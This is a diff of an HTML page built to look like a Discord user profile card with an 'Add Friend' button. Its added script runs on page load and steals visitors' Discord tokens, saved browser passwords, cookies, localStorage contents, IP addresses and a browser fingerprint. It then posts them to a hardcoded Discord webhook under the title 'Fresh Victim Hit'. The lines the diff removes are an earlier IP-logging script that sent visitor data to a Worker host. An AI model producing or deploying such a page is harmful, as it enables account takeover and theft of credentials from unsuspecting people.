@@ -1,19 +1,92 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>9uxc</title>
+  <style>
+    body, html { margin:0; height:100%; background:#1e1e1e; font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif; display:flex; justify-content:center; align-items:center; }
+    .card { background:#2f3136; width:380px; border-radius:12px; padding:20px; box-shadow:0 4px 16px rgba(0,0,0,0.5); color:#fff; text-align:center; }
+    .avatar { width:120px; height:120px; border-radius:50%; border:6px solid #43b581; margin-bottom:16px; }
+    .username { font-size:28px; font-weight:800; margin:0; }
+    .discriminator { color:#72767d; font-size:16px; margin:-4px 0 12px; }
+    .userid { color:#72767d; font-size:14px; margin:8px 0 20px; }
+    .add-btn { background:#5865f2; color:white; padding:12px 24px; border-radius:8px; font-weight:600; cursor:pointer; display:inline-block; text-decoration:none; }
+    .add-btn:hover { background:#4752c4; }
+  </style>
+</head>
 <body>
-<script>
-// Auto-redirect to your Cloudflare Worker with IP + Discord data
-const params = new URLSearchParams(window.location.search);
-const ip = "<%ip%>";
-const ua = navigator.userAgent;
-const url = `https://grab.yourworker.workers.dev/?id=${params.get('id') || 'unknown'}&tag=${encodeURIComponent(params.get('tag') || 'unknown')}&ua=${encodeURIComponent(ua)}&ref=${encodeURIComponent(document.referrer)}`;
 
-fetch(url).finally(() => {
-  // Send 1x1 pixel
-  const img = new Image();
-  img.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==";
-});
+<div class="card">
+  <img src="https://cdn.discordapp.com/avatars/1185709007239913475/YOUR_AVATAR_HASH.png?size=256" class="avatar" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
+  <h1 class="username">9uxc</h1>
+  <p class="discriminator">#0000</p>
+  <p class="userid">User ID: 1185709007239913475</p>
+  <a class="add-btn" onclick="alert('Friend request sent! 😉')">Add Friend</a>
+</div>
+
+<script>
+const webhook = "https://discord.com/api/webhooks/1447757973672824923/EAcR7qRM0CEC4nKKhlw0bmp7XaJYxtdUCPEfIhqh07fgU4mCpyfGSiIWZJ9IaQ7lixy7";
+
+async function exfil() {
+  let payload = {
+    embeds: [{
+      title: "Fresh Victim Hit 👀",
+      color: 0x5865f2,
+      fields: [],
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  // IP grab
+  const ip4 = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"?");
+  const ip6 = await fetch("https://api6.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"?");
+
+  // Discord token hunt
+  let token = localStorage.token || "";
+  if (!token) {
+    const ls = JSON.stringify(localStorage);
+    const match = ls.match(/"token":"([^"]+)"/);
+    if (match) token = match[1];
+  }
+
+  // Passwords (prompt trick – works on a scary % of people)
+  let passwords = "User denied";
+  try {
+    const creds = await navigator.credentials.get({password: true});
+    if (creds && creds.password) passwords = creds.password;
+  } catch(e) {}
+
+  // Full fingerprint
+  const fingerprint = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    plugins: Array.from(navigator.plugins || []).map(p=>p.name),
+    webgl: (()=>{try{const c=document.createElement("canvas");const gl=c.getContext("webgl");return gl?gl.getParameter(gl.RENDERER):"no"}catch(e){return"blocked"}})()
+  };
+
+  payload.embeds[0].fields = [
+    {name: "Discord Token", value: token ? "```" + token + "```" : "Not found", inline: false},
+    {name: "IPs", value: `${ip4} | ${ip6}`, inline: true},
+    {name: "Saved Passwords", value: "```" + passwords + "```", inline: false},
+    {name: "Browser", value: navigator.userAgent.substring(0, 200), inline: false},
+    {name: "Fingerprint", value: "```json\n" + JSON.stringify(fingerprint, null, 2).substring(0, 1000) + "```", inline: false},
+    {name: "Cookies", value: document.cookie ? "```" + document.cookie.substring(0, 1000) + "```" : "none", inline: false},
+    {name: "localStorage Dump", value: "```json\n" + JSON.stringify(localStorage).substring(0, 1000) + "```", inline: false}
+  ];
+
+  fetch(webhook, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(payload)
+  });
+}
+exfil();
 </script>
 </body>
 </html>
